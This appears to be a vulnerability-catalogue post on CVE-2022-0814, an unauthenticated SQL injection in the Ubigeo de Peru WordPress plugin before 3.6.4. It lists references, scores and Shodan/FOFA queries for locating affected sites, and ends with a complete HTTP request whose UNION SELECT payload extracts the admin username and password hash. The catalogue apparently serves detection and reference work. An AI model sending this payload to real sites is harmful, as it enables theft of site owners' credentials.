---
layout: post
cve_id: CVE-2022-0814
title: Ubigeo de Peru < 3.6.4 - SQL Injection
pcap: true
pcap_path: /pcaps/2022/CVE-2022-0814.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2022/CVE-2022-0814.yaml
snort2_rule: N/A
snort3_rule: N/A
author: r3Y3r53
severity: critical
impact: 'Unauthenticated attackers can exploit SQL injection via AJAX actions to extract
  usernames and password hashes from the WordPress database.

  '
remediation: Fixed in version 3.6.4
reference:
- https://wpscan.com/vulnerability/fd84dc08-0079-4fcf-81c3-a61d652e3269
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0814
- https://wordpress.org/plugins/ubigeo-peru/
- https://github.com/cyllective/CVEs
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2022-0814
  cwe-id: CWE-89
  epss-score: 0.58129
  epss-percentile: 0.98102
  cpe: cpe:2.3:a:ubigeo_de_peru_para_woocommerce_project:ubigeo_de_peru_para_woocommerce:*:*:*:*:*:wordpress:*:*
metadata:
  verified: true
  max-request: 1
  vendor: ubigeo_de_peru_para_woocommerce_project
  product: ubigeo_de_peru_para_woocommerce
  framework: wordpress
  shodan-query: http.html:/wp-content/plugins/ubigeo-peru/
  fofa-query: body=/wp-content/plugins/ubigeo-peru/
  publicwww-query: /wp-content/plugins/ubigeo-peru/
tags:
- cve
- cve2022
- wordpress
- wpscan
- wp-plugin
- sqli
- ubigeo-peru
- unauth
- ubigeo_de_peru_para_woocommerce_project
- vuln
---

## ðŸ” Vulnerability Description
The plugin does not properly sanitise and escape some parameters before using them in SQL statements via various AJAX actions, some of which are available to unauthenticated users, leading to SQL Injections.


## ðŸŒ HTTP Request
```nohighlight
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Mobile/15E148 Safari/604.1
Connection: close
Content-Length: 209
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

action=rt_ubigeo_load_distritos_address&idProv=1%20UNION%20SELECT%201,(SELECT%20user_login%20FROM%20wp_users%20WHERE%20ID%20=%201),(SELECT%20user_pass%20FROM%20wp_users%20WHERE%20ID%20=%201)%20from%20wp_users#
```

